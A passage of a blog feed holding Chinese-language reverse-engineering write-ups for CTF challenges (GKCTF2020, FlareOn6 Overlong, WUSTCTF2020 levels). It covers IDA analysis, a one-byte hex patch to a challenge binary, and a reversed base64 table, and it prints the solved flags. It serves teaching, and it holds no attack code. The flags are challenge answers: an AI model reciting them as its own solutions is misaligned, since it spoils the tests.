		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;280&#34;
		data-flex-basis=&#34;673px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;↑这个是对输入的字符出进行处理，这个for可有点东西，以下是我个人理解：&lt;/p&gt;
&lt;p&gt;首先取值i，i的范围是0-v8，v8一开始是0，通过下面的v9语句进行自增，也就是说这个i的范围是数组v12从开始到某个值的一段。(对那个sub_411325其实是返回数组内容)&lt;/p&gt;
&lt;p&gt;这个值的判断标准就是中间的 *i &amp;lt;
*v11,也就是说，把所有v12数组中小于v11的值取出来累加得到v9，再和v11异或保存。而v11恰好就是我们输入的字符串，也就是flag。&lt;/p&gt;
&lt;p&gt;那么现在有个问题，我们知道v11是输入，那v12是啥？&lt;/p&gt;
&lt;p&gt;寻找最先出现v12的位置，sub_4112F8：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185446810-406975578.png&#34;
	width=&#34;410&#34;
	height=&#34;268&#34;
	srcset=&#34;https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185446810-406975578_hu8082062490072715668.png 480w, https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185446810-406975578_hu1592266439065385515.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;152&#34;
		data-flex-basis=&#34;367px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;那个判断条件是这样的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185447184-987702409.png&#34;
	width=&#34;248&#34;
	height=&#34;166&#34;
	srcset=&#34;https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185447184-987702409_hu14949648323640019849.png 480w, https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185447184-987702409_hu4014844979958996378.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;149&#34;
		data-flex-basis=&#34;358px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;如果是质数，那么保存。&lt;/p&gt;
&lt;p&gt;如此一来我们就可以知道，整个算法是将1-128的质数保存在数组，然后依次遍历每个flag的字符，将比字符小的质数累加的和与该字符异或，最后对比：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185447550-1062530294.png&#34;
	width=&#34;336&#34;
	height=&#34;519&#34;
	srcset=&#34;https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185447550-1062530294_hu8132087140281077791.png 480w, https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185447550-1062530294_hu9408543296459069640.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;64&#34;
		data-flex-basis=&#34;155px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;C代码：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185448071-628776074.png&#34;
	width=&#34;939&#34;
	height=&#34;613&#34;
	srcset=&#34;https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185448071-628776074_hu16276729225594846546.png 480w, https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185448071-628776074_hu14586406942446613769.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;153&#34;
		data-flex-basis=&#34;367px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185448400-914752966.png&#34;
	width=&#34;261&#34;
	height=&#34;32&#34;
	srcset=&#34;https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185448400-914752966_hu18201458276789297111.png 480w, https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185448400-914752966_hu11631271303812689042.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;815&#34;
		data-flex-basis=&#34;1957px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;有一说一，我是真的看着这些个sub函数顶的不行，还是见识太少。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【FlareOn6】Overlong</title>
        <link>https://dorinxl.github.io/p/flareon6overlong/</link>
        <pubDate>Sat, 30 May 2020 10:33:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/flareon6overlong/</guid>
        <description>&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183323659-1542257090.png&#34;
	width=&#34;500&#34;
	height=&#34;378&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183323659-1542257090_hu8293130724131794810.png 480w, https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183323659-1542257090_hu18182139697418721085.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;132&#34;
		data-flex-basis=&#34;317px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;Flare-on第六届挑战赛的题，&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183324158-697008300.png&#34;
	width=&#34;518&#34;
	height=&#34;254&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183324158-697008300_hu15857375643899300403.png 480w, https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183324158-697008300_hu5021648764769391871.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;203&#34;
		data-flex-basis=&#34;489px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;挺迷的，这个挑战赛的题都挺有水平。&lt;/p&gt;
&lt;p&gt;IDA打开就仨函数：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183324483-1018243791.png&#34;
	width=&#34;313&#34;
	height=&#34;88&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183324483-1018243791_hu15180091464042953938.png 480w, https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183324483-1018243791_hu14858454486961189265.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;355&#34;
		data-flex-basis=&#34;853px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;Main函数也挺简单：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183324765-1108276765.png&#34;
	width=&#34;418&#34;
	height=&#34;210&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183324765-1108276765_hu9983490562096553523.png 480w, https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183324765-1108276765_hu1874760518462288302.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;199&#34;
		data-flex-basis=&#34;477px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;对v4处理，存到text，输出，没了。&lt;/p&gt;
&lt;p&gt;然而疑惑的地方是，v4有这么长：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183325172-534356750.png&#34;
	width=&#34;380&#34;
	height=&#34;602&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183325172-534356750_hu990389486645546524.png 480w, https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183325172-534356750_hu11466294834475534249.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;63&#34;
		data-flex-basis=&#34;151px&#34;
	
&gt;（比这个还长）&lt;/p&gt;
&lt;p&gt;但是&lt;img src=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183325454-80048503.png&#34;
	width=&#34;293&#34;
	height=&#34;25&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183325454-80048503_hu4856310613960785494.png 480w, https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183325454-80048503_hu12411924749462540832.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1172&#34;
		data-flex-basis=&#34;2812px&#34;
	
&gt;这里指处理了28，即0x1C的长度。&lt;/p&gt;
&lt;p&gt;结合他运行时跑出的数据：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183325767-741460890.png&#34;
	width=&#34;154&#34;
	height=&#34;73&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183325767-741460890_hu6626797747156188770.png 480w, https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183325767-741460890_hu15290661100991778028.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;210&#34;
		data-flex-basis=&#34;506px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;数了数算上空格正好是这么长，我有理由怀疑他没有处理后面的字符。&lt;/p&gt;
&lt;p&gt;所以我们要做的就是把处理长度从0x1C延长到整个长度，数了数是0xAF个字符。&lt;/p&gt;
&lt;p&gt;从：&lt;img src=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183326009-79468711.png&#34;
	width=&#34;320&#34;
	height=&#34;40&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183326009-79468711_hu12072917502101460785.png 480w, https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183326009-79468711_hu15375979546681895159.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;800&#34;
		data-flex-basis=&#34;1920px&#34;
	
&gt;到&lt;img src=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183326290-1651864204.png&#34;
	width=&#34;297&#34;
	height=&#34;35&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183326290-1651864204_hu11710101843965166644.png 480w, https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183326290-1651864204_hu5357255619466737405.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;848&#34;
		data-flex-basis=&#34;2036px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;B6 – 08 + 1= B8 – 08 - 1 = B0 – 1 = AF&lt;/p&gt;
&lt;p&gt;所以我下意识打开OD去改数据。&lt;/p&gt;
&lt;p&gt;为什么不用IDA改？因为我改了之后不会保存成二进制文件。&lt;/p&gt;
&lt;p&gt;然鹅打开OD之后我发现，根本找不到这段数据，好像直接进入dll了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183326525-197095771.png&#34;
	width=&#34;426&#34;
	height=&#34;117&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183326525-197095771_hu6981362092322131648.png 480w, https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183326525-197095771_hu13701202420153250251.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;364&#34;
		data-flex-basis=&#34;873px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;然后我想了想，怎么修改呢？&lt;/p&gt;
&lt;p&gt;文件的本质就是二进制啊！那我直接找个十六进制修改器，找到对应的机器码不就行了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183326714-677728669.png&#34;
	width=&#34;102&#34;
	height=&#34;39&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183326714-677728669_hu11126588632683421764.png 480w, https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183326714-677728669_hu17966496126130024523.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;261&#34;
		data-flex-basis=&#34;627px&#34;
	
&gt;这里本来是6A
1C 68 ，改成了6A AF 68，再次运行：&lt;br&gt;
&lt;img src=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183326936-1235356863.png&#34;
	width=&#34;346&#34;
	height=&#34;76&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183326936-1235356863_hu7859473369095030929.png 480w, https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183326936-1235356863_hu15180861708226627403.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;455&#34;
		data-flex-basis=&#34;1092px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183327116-691585667.png&#34;
	width=&#34;161&#34;
	height=&#34;161&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183327116-691585667_hu375789052765070783.png 480w, https://dorinxl.github.io/p/flareon6overlong/1858293-20200530183327116-691585667_hu15585005863052277318.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;100&#34;
		data-flex-basis=&#34;240px&#34;
	
&gt;（其实也可以按照程序逻辑写一遍代码，但是我觉得太麻烦了）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【WUSTCTF2020】level4</title>
        <link>https://dorinxl.github.io/p/wustctf2020level4/</link>
        <pubDate>Thu, 28 May 2020 13:17:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/wustctf2020level4/</guid>
        <description>&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level4/1858293-20200528211726511-339082420.png&#34;
	width=&#34;500&#34;
	height=&#34;492&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level4/1858293-20200528211726511-339082420_hu2929044983494328582.png 480w, https://dorinxl.github.io/p/wustctf2020level4/1858293-20200528211726511-339082420_hu10572089646293488857.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;101&#34;
		data-flex-basis=&#34;243px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;武科大re第五题，无壳：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level4/1858293-20200528211727061-1286857489.png&#34;
	width=&#34;518&#34;
	height=&#34;254&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level4/1858293-20200528211727061-1286857489_hu13518011802278947959.png 480w, https://dorinxl.github.io/p/wustctf2020level4/1858293-20200528211727061-1286857489_hu13731812135076341811.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;203&#34;
		data-flex-basis=&#34;489px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;拖进IDA，看到了关键词【数据结构】，还有关键函数，大致猜了一下估计是遍历树，kali跑一跑看看&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level4/1858293-20200528211727466-257635199.png&#34;
	width=&#34;597&#34;
	height=&#34;261&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level4/1858293-20200528211727466-257635199_hu1823671095934967656.png 480w, https://dorinxl.github.io/p/wustctf2020level4/1858293-20200528211727466-257635199_hu698685178047582946.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;228&#34;
		data-flex-basis=&#34;548px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level4/1858293-20200528211727751-232430662.png&#34;
	width=&#34;273&#34;
	height=&#34;134&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level4/1858293-20200528211727751-232430662_hu4568825685000305317.png 480w, https://dorinxl.github.io/p/wustctf2020level4/1858293-20200528211727751-232430662_hu3737947322895249089.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;203&#34;
		data-flex-basis=&#34;488px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level4/1858293-20200528211728176-1903654041.png&#34;
	width=&#34;444&#34;
	height=&#34;100&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level4/1858293-20200528211728176-1903654041_hu9000253091485058682.png 480w, https://dorinxl.github.io/p/wustctf2020level4/1858293-20200528211728176-1903654041_hu11913820349623383678.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;444&#34;
		data-flex-basis=&#34;1065px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;果然，第一行和第二行第一个都是2，那估计是后序和中序的遍历。联想前面做的题都是wctf开头的，可以推出来第二行是后序，因为后序最后一个字母是根节点。&lt;/p&gt;
&lt;p&gt;手动算前序，其中有两个下划线连在一起了，于是我把那一枝分别写了出来（但是问题不大）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level4/1858293-20200528211728599-137089107.png&#34;
	width=&#34;325&#34;
	height=&#34;433&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level4/1858293-20200528211728599-137089107_hu17711541448162952449.png 480w, https://dorinxl.github.io/p/wustctf2020level4/1858293-20200528211728599-137089107_hu5433042367854560931.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;75&#34;
		data-flex-basis=&#34;180px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;wctf2020{This_IS_A_7reE}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【WUSTCTF2020】level3</title>
        <link>https://dorinxl.github.io/p/wustctf2020level3/</link>
        <pubDate>Mon, 25 May 2020 10:45:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/wustctf2020level3/</guid>
        <description>&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184447716-1057618486.png&#34;
	width=&#34;500&#34;
	height=&#34;426&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184447716-1057618486_hu18406549173535375172.png 480w, https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184447716-1057618486_hu8450163767710216097.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;117&#34;
		data-flex-basis=&#34;281px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;查壳：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184448196-2146322687.png&#34;
	width=&#34;518&#34;
	height=&#34;254&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184448196-2146322687_hu17458041832522300540.png 480w, https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184448196-2146322687_hu5390329141843924519.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;203&#34;
		data-flex-basis=&#34;489px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;无壳，扔进IDA：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184448822-1261510711.png&#34;
	width=&#34;743&#34;
	height=&#34;431&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184448822-1261510711_hu2835161801441389791.png 480w, https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184448822-1261510711_hu10484944772536817073.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;172&#34;
		data-flex-basis=&#34;413px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;看到关键数据，base64转一下试试：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184449121-1888071843.png&#34;
	width=&#34;528&#34;
	height=&#34;226&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184449121-1888071843_hu11265914001502226234.png 480w, https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184449121-1888071843_hu15702872345184398352.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;233&#34;
		data-flex-basis=&#34;560px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;有点flag那味了，估计这是把base64表给改了，那么就需要找一下修改的函数，在函数列表找到一个O_OloolAtYou()函数，看起来有些可疑，果不其然：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184449361-1017951627.png&#34;
	width=&#34;335&#34;
	height=&#34;247&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184449361-1017951627_hu1121369089707870950.png 480w, https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184449361-1017951627_hu1657917022803438285.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;135&#34;
		data-flex-basis=&#34;325px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;其实也可以交叉引用找到这个函数：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184449593-2120695649.png&#34;
	width=&#34;622&#34;
	height=&#34;398&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184449593-2120695649_hu6208022611919640671.png 480w, https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184449593-2120695649_hu12132166128848053510.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;156&#34;
		data-flex-basis=&#34;375px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这个函数主要作用呢，我们跑一下就可以知道是把A-T给调了个顺序：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184449777-1803394244.png&#34;
	width=&#34;523&#34;
	height=&#34;41&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184449777-1803394244_hu5442323095273636127.png 480w, https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184449777-1803394244_hu8709031108900520722.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1275&#34;
		data-flex-basis=&#34;3061px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;于是我们就把他反过来跑一下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184450166-765666664.png&#34;
	width=&#34;960&#34;
	height=&#34;464&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184450166-765666664_hu4593995936931273934.png 480w, https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184450166-765666664_hu5585789955880846397.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;206&#34;
		data-flex-basis=&#34;496px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;得到：d2N0ZjIwMjB7QmFzZTY0X2lzX3RoZV9zdGFydF9vZl9yZXZlcnNlfQ==&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184450469-374602815.png&#34;
	width=&#34;483&#34;
	height=&#34;224&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184450469-374602815_hu14254047077410962324.png 480w, https://dorinxl.github.io/p/wustctf2020level3/1858293-20200525184450469-374602815_hu3766798001127727412.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;215&#34;
		data-flex-basis=&#34;517px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;wctf2020{Base64_is_the_start_of_reverse}&lt;/p&gt;
&lt;p&gt;吃饭去了，一会还要上课，本来说把c++大作业给写了的，一不小心有做了俩题，水了一波分数，溜了溜了；&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【WUSTCTF2020】Cr0ssfun</title>
        <link>https://dorinxl.github.io/p/wustctf2020cr0ssfun/</link>
        <pubDate>Mon, 25 May 2020 10:05:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/wustctf2020cr0ssfun/</guid>
        <description>&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180525863-990361983.png&#34;
	width=&#34;500&#34;
	height=&#34;426&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180525863-990361983_hu16720610104115565332.png 480w, https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180525863-990361983_hu5001410855383104024.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;117&#34;
		data-flex-basis=&#34;281px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;顺着前两个题我直接顺藤摸瓜摸到了武汉科技大学这一届的ctf，干脆全做了吧，看上去也不难，非常友好：&lt;/p&gt;
&lt;p&gt;经典无壳：&lt;br&gt;
&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180526354-1500460913.png&#34;
	width=&#34;518&#34;
	height=&#34;254&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180526354-1500460913_hu13120405343145057643.png 480w, https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180526354-1500460913_hu15116212318754127116.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;203&#34;
		data-flex-basis=&#34;489px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;扔进IDA发现也是判断一下输入就可，里面的判断函数甚是粗暴：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180526710-1315745704.png&#34;
	width=&#34;422&#34;
	height=&#34;154&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180526710-1315745704_hu13137145723695156899.png 480w, https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180526710-1315745704_hu6370862963529932869.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;274&#34;
		data-flex-basis=&#34;657px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180526917-2103185122.png&#34;
	width=&#34;422&#34;
	height=&#34;158&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180526917-2103185122_hu6204176359790334385.png 480w, https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180526917-2103185122_hu3795218216432989953.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;267&#34;
		data-flex-basis=&#34;641px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180527124-118713452.png&#34;
	width=&#34;422&#34;
	height=&#34;156&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180527124-118713452_hu16385846179234359904.png 480w, https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180527124-118713452_hu15100553582283818626.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;270&#34;
		data-flex-basis=&#34;649px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180527595-1334219795.png&#34;
	width=&#34;422&#34;
	height=&#34;158&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180527595-1334219795_hu14229256628778407854.png 480w, https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180527595-1334219795_hu1838774499023859478.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;267&#34;
		data-flex-basis=&#34;641px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180527841-1177711980.png&#34;
	width=&#34;415&#34;
